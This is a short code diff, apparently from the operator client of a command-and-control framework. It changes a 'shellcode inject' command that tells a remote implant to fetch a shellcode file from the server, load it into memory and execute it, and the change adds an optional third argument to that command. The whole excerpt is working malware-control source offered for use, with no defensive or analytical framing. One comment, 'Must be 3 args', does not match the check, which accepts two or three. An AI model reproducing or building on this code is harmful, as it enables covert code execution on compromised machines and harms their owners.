@@ -141,8 +141,8 @@ def cmd_shell(args: List[str], app):
 # The command is read first, and tells the implant where to pull the 
 # shellcode file from on the server, reads it into memory, and executes
 def cmd_shellcode_inject(args: List[str], app):
-    # Must be 2 args
-    client_errors.arg_len_error(args, 2, 2)
+    # Must be 3 args
+    client_errors.arg_len_error(args, min=2, max=3)
 
     # Create a file id for the file to be saved
     file_id = encryption.id_generator(N=32)
@@ -151,7 +151,7 @@ def cmd_shellcode_inject(args: List[str], app):
     cmd_id = encryption.id_generator(N=32)
 
     # Create the command string
-    cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_INJECT, [file_id]) 
+    cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_INJECT, [file_id, args[2]]) 
 
     # Post the file, if it doesn't exist, will raise FileDoesntExist exception
     uploaded_filename = post_file_command(file_path=args[1],
